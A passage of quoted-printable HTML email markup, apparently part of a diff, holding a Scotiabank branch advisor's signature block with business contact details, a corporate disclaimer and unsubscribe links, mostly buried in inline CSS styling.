+G-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT=
+: 0px; font-stretch: inherit; -webkit-font-smoothing: antialiased'>Small Bu=
+siness Advisor and Mutual Funds Representative*</SPAN>
+ <SPAN style=3D"FONT-SIZE: 7pt; BORDER-TOP: 0px; FONT-FAMILY: Tahoma, sans-=
+serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COL=
+OR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT=
+: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -webkit-font=
+-smoothing: antialiased"><BR style=3D"-webkit-font-smoothing: antialiased">=
+</SPAN>
+<SPAN style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-st=
+retch: inherit; -webkit-font-smoothing: antialiased'>______________________=
+________</SPAN><SPAN>&nbsp;</SPAN>
+ <SPAN style=3D"FONT-SIZE: 7pt; BORDER-TOP: 0px; FONT-FAMILY: Tahoma, sans-=
+serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COL=
+OR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT=
+: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -webkit-font=
+-smoothing: antialiased"><WBR style=3D"-webkit-font-smoothing: antialiased"=
+></SPAN>
+<SPAN style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-st=
+retch: inherit; -webkit-font-smoothing: antialiased'>______________________=
+________</SPAN><SPAN>&nbsp;</SPAN>
+ <SPAN style=3D"FONT-SIZE: 7pt; BORDER-TOP: 0px; FONT-FAMILY: Tahoma, sans-=
+serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COL=
+OR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT=
+: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -webkit-font=
+-smoothing: antialiased"><WBR style=3D"-webkit-font-smoothing: antialiased"=
+></SPAN>
+<SPAN style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-st=
+retch: inherit; -webkit-font-smoothing: antialiased'>______________________=
+___</SPAN></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><B style=3D"-=
+webkit-font-smoothing: antialiased"><SPAN style=3D'FONT-SIZE: 12pt; BORDER-=
+TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Light", sans-serif; BORD=
+ER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: red; PA=
+DDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; M=
+ARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -webkit-font-smoothi=
+ng: antialiased'>Scotiabank</SPAN></B>
+ <B style=3D"-webkit-font-smoothing: antialiased"><SPAN>&nbsp;</SPAN><SPAN =
+style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "H=
+elvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; B=
+ORDER-BOTTOM: 0px; COLOR: red; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDI=
+NG-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stret=
+ch: inherit; -webkit-font-smoothing: antialiased'>&nbsp;</SPAN></B><SPAN>&n=
+bsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Lig=
+ht", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: base=
+line; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; P=
+ADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-s=
+tretch: inherit; -webkit-font-smoothing: antialiased'><B style=3D"-webkit-f=
+ont-smoothing: antialiased">|</B></SPAN><B style=3D"-webkit-font-smoothing:=
+ antialiased"><SPAN>&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Lig=
+ht", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: base=
+line; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; P=
+ADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-s=
+tretch: inherit; -webkit-font-smoothing: antialiased'>&nbsp;Lynden Road</SP=
+AN></B></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-=
+stretch: inherit; -webkit-font-smoothing: antialiased'>61 Lynden Rd, Brantf=
+ord, ON&nbsp;N3R 7J9 Canada</SPAN></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-=
+stretch: inherit; -webkit-font-smoothing: antialiased'></SPAN>&nbsp;</P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-=
+stretch: inherit; -webkit-font-smoothing: antialiased'>T 1.519.751.1027 x45=
+04 F 519.751.4747</SPAN></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><U style=3D"-=
+webkit-font-smoothing: antialiased"><SPAN style=3D"FONT-SIZE: 9pt; BORDER-T=
+OP: 0px; FONT-FAMILY: Arial, sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN:=
+ baseline; BORDER-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-=
+RIGHT: 0px; font-stretch: inherit; -webkit-font-smoothing: antialiased">
+<A style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; B=
+ORDER-BOTTOM: 0px; COLOR: black; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PAD=
+DING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; -webkit-=
+font-smoothing: antialiased" href=3D"mailto:michaell.harfmann@scotiabank.co=
+m" rel=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; BORDER-BOTTOM: 0px; COLOR: blue; PADDING-BOTTOM: 0px; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; fon=
+t-stretch: inherit; -webkit-font-smoothing: antialiased'>michaell.harfmann@=
+scotiabank.com</SPAN>
+ <SPAN style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baselin=
+e; BORDER-BOTTOM: 0px; COLOR: blue; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; -webk=
+it-font-smoothing: antialiased"><WBR style=3D"-webkit-font-smoothing: antia=
+liased"></SPAN></A></SPAN></U></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-=
+stretch: inherit; -webkit-font-smoothing: antialiased'>Scotiabank.com</SPAN=
+></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-=
+stretch: inherit; -webkit-font-smoothing: antialiased'>Scotiabank&nbsp;is a=
+ business name used by The Bank of Nova Scotia</SPAN>
+ </P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-=
+stretch: inherit; -webkit-font-smoothing: antialiased'></SPAN>&nbsp;</P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: rgb(77,77,77); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-=
+stretch: inherit; -webkit-font-smoothing: antialiased'>
+*Mutual Funds Representative with Scotia Securities Inc. distribute mutual =
+funds at Scotiabank branches.</SPAN></P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased"><SPAN style=
+=3D'FONT-SIZE: 12pt; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvet=
+ica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER=
+-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT:=
+ 0px; BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inhe=
+rit; -webkit-font-smoothing: antialiased'></SPAN>&nbsp;</P>
+<P style=3D"MARGIN: 0px; -webkit-font-smoothing: antialiased">&nbsp;</P></D=
+IV>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "=
+Segoe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFon=
+t, Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN:=
+ baseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT=
+-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px;=
+ FONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px;=
+ ORPHANS: 2; WIDOWS: 2; MARGIN: 0px;=20
+LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,2=
+55); TEXT-INDENT: 0px; font-stretch: inherit; font-variant-numeric: inherit=
+; font-variant-east-asian: inherit; -webkit-font-smoothing: antialiased; fo=
+nt-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-strok=
+e-width: 0px; text-decoration-style: initial; text-decoration-color: initia=
+l'>T</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Lig=
+ht", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: base=
+line; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRAN=
+SFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT=
+-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPH=
+ANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px;=
+ BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>o unsubscribe f=
+rom receiving further commercial electronic messages from The Bank of Nova =
+Scotia in Canada, please click here:&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"https://unsubscribe.scotiabank.com/?entid=3DBNS&amp;buid=3DSBNK" rel=
+=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>https://unsubscribe.scotiabank.com?enti=
+d=3DBNS&amp;buid=3DSBNK</SPAN><WBR style=3D"-webkit-font-smoothing: antiali=
+ased"><WBR style=3D"-webkit-font-smoothing: antialiased">
+ </A>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>To unsubscribe =
+from receiving further commercial electronic messages from certain other se=
+nders set out in the attached list, please click here:&nbsp;</SPAN>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'><SPAN>&nbsp;</SPAN></SPAN>
+ <A style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Segoe UI", "Se=
+goe UI Web (West European)", "Segoe UI", -apple-system, BlinkMacSystemFont,=
+ Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: b=
+aseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-T=
+RANSFORM: none; FONT-WEIGHT: 400; COLOR: black; PADDING-BOTTOM: 0px; FONT-S=
+TYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHAN=
+S: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING:=20
+normal; PADDING-RIGHT: 0px; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT=
+: 0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-e=
+ast-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px' hr=
+ef=3D"https://www.unsubscribe.gwm.scotiabank.com/?page=3Dgwm" rel=3D"noopen=
+er noreferrer" target=3D_blank data-auth=3D"NotApplicable">
+<SPAN style=3D'BORDER-TOP: 0px; FONT-FAMILY: "Calibri Light", "Helvetica Li=
+ght", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTO=
+M: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; =
+BORDER-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; font-stretch: inherit; -=
+webkit-font-smoothing: antialiased'>https://www.unsubscribe.gwm.scotiabank.=
+com?page=3Dgwm</SPAN><WBR style=3D"-webkit-font-smoothing: antialiased"></A>
+ <SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (We=
+st European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helv=
+etica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FLOAT: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,30); FONT-STYLE=
+: normal; ORPHANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING=
+: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-varian=
+t-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'></SPAN>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
+STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHA=
+NS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; =
+BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=20
+0px; font-stretch: inherit; font-variant-numeric: inherit; font-variant-eas=
+t-asian: inherit; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text=
+-decoration-style: initial; text-decoration-color: initial'>&nbsp;</SPAN>
+ <BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West=
+ European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvet=
+ica Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFO=
+RM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS:=
+ 2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); =
+TEXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligatur=
+es: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<BR style=3D'FONT-SIZE: 16px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helveti=
+ca Neue", sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFOR=
+M: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: =
+2; WIDOWS: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); T=
+EXT-INDENT: 0px; -webkit-font-smoothing: antialiased; font-variant-ligature=
+s: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial'>
+<SPAN style=3D'FONT-SIZE: 16px; BORDER-TOP: 0px; FONT-FAMILY: "Calibri Ligh=
+t", "Helvetica Light", sans-serif; BORDER-RIGHT: 0px; VERTICAL-ALIGN: basel=
+ine; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); PADDING-BOTTOM: 0px; FONT-=
